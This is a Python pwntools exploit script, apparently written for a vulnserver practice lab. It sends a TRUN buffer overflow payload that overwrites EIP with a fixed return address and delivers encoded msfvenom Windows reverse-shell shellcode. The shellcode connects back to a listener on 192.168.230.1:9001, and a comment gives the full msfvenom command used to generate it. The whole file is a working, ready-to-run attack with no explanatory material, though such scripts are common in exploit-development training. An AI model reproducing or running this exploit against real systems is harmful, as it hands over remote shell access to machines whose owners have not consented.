#!/bin/python
import argparse
# resolve argv parsing problem
import pwnlib.args
pwnlib.args.free_form = False
from pwn import *

host="192.168.230.130"
port=9999
offset=2005
total=2500
eip=p32(0x625011AF)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.230.1 LPORT=9001 -f python -v shellcode -b "\x00" EXITFUNC=thread -e x86/shikata_ga_nai -i 5

shellcode =  b"\x90\x90\x90\x90"*4
shellcode += b"\xbe\x10\xb8\x74\xab\xda\xcb\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x6d\x31\x73\x12\x83\xeb\xfc"
shellcode += b"\x03\x63\xb6\x96\x5e\x59\x1a\xe9\xa8\xec\x38"
shellcode += b"\xe9\x72\x7a\x1b\xe2\xdb\xb3\xaa\xbb\x82\x30"
shellcode += b"\xea\xb8\x7b\x48\xe7\xc3\x05\xa9\x54\xaa\xdf"
shellcode += b"\x0e\x10\xd7\xdd\x9b\x93\xae\x82\xcc\x1f\xa3"
shellcode += b"\xe9\xac\xe5\x60\xab\x4a\x7e\x31\xb4\xb4\xeb"
shellcode += b"\xe5\x27\x16\xbc\xe0\xbe\x65\xb9\x9f\xde\x37"
shellcode += b"\xb4\xbe\x41\x80\x05\xd1\xcf\x3f\x5b\x3a\xd7"
shellcode += b"\x46\x63\x5c\x4a\x8e\x11\x1e\x5e\x54\x93\xdb"
shellcode += b"\x36\x11\xec\x5f\xc4\xd1\x40\xb9\xf1\xda\x69"
shellcode += b"\x28\x9a\x64\xc2\xfb\x52\x48\x1d\x04\xf7\x98"
shellcode += b"\xfd\x0a\xb1\xeb\x8b\xcc\x43\xd5\x68\x3f\x69"
shellcode += b"\xb0\x4d\xfd\xfa\xcb\x6c\x83\xaf\x1e\x34\x09"
shellcode += b"\x3c\xe6\xf5\x11\x40\x8a\xb1\xa2\xb2\xd8\x94"
shellcode += b"\x5c\xf4\x20\xcf\x27\x41\xe6\xc7\xca\x23\x33"
shellcode += b"\x2f\x03\xb1\xcb\x6a\xe7\xf6\x5f\x67\x3b\x86"
shellcode += b"\xc8\x35\x4b\x0f\x20\xf6\x75\xe3\x55\x12\xe8"
shellcode += b"\x7c\x66\x1f\x2d\x10\x0b\x8b\xcf\x99\x3e\x11"
shellcode += b"\x32\xc7\x45\xc0\x78\xe1\xbb\xb7\xbe\x08\x8d"
shellcode += b"\xba\x1b\x65\xf0\x6c\x7d\x41\x42\xed\x46\x67"
shellcode += b"\xa0\xf8\x19\xf5\xfc\xdf\x1d\x93\x8a\x07\x9d"
shellcode += b"\x5b\xb6\xaf\x7f\xf7\xfb\x02\x03\x56\x97\xc4"
shellcode += b"\x28\xb5\xb5\x74\x2e\x88\x76\xa1\xb1\xd7\x39"
shellcode += b"\x59\xd6\x8b\x2c\x4e\x16\x21\xa7\xbc\xf3\xdb"
shellcode += b"\xfe\xe6\xe1\x95\xf2\x39\x8b\x2d\xd9\xfb\xa2"
shellcode += b"\x6d\xfb\x34\x87\xfb\x46\x77\x8a\x60\x9f\x74"
shellcode += b"\x78\x27\x34\xd6\x02\xb2\x14\xd6\xc7\x8c\x77"
shellcode += b"\x40\xd0\xa9\x44\x2e\x4f\x4b\x2d\x8a\xb6\xac"
shellcode += b"\xe0\x53\x5d\xd4\x62\x97\x88\xf2\x81\xac\xdf"
shellcode += b"\x61\x12\xc5\x6d\xa5\x59\xfb\x1b\xa0\xca\x34"
shellcode += b"\x56\x74\x05\x02\x37\x2d\xb3\x5d\xe5\x73\x67"
shellcode += b"\x8c\x17\xc8\xaa\xa8\x23\x8c\xd9\xe5\x42\xeb"
shellcode += b"\xf1\xe9\xbf\xf0\x23\x0f\xc6\xc0\xe7\xe4\xf4"
shellcode += b"\x6a\x68\x23\x09\x94\x5e\x8c\xa7\x1c\x60\xc2"
shellcode += b"\xd5\x2d\xaf\xfb\x4d\xff\x10\x57\xd2\x05\xbc"
shellcode += b"\x9b\x0d\xe6\xea\xf2\x57\x29\x31\x06\x2a\xfb"
shellcode += b"\x74\x92\x13\x28\x4c\x32\xbc\x56\x1c\x4b\x05"
shellcode += b"\xaf\x3a\xe7\xdc\xf6\xd0\x52\x93\x20\x7f\x34"
shellcode += b"\xcd\x52\x55\x2f\x0d\xa9\xe2\xb8\x0a\x3c\x8d"
shellcode += b"\x8e\xa9\x30\x3c\x31\x98\x31\xd9\xe4\x82\x7d"
shellcode += b"\x5f\x3c\xfe\x56\x5c\x42\x0a\x1b"


con =remote(host,port)
payload=b"TRUN . "+b"A"*2005+eip+shellcode
print(con.recvline())
con.sendline(payload)
print(con.recvline())

print("Done")
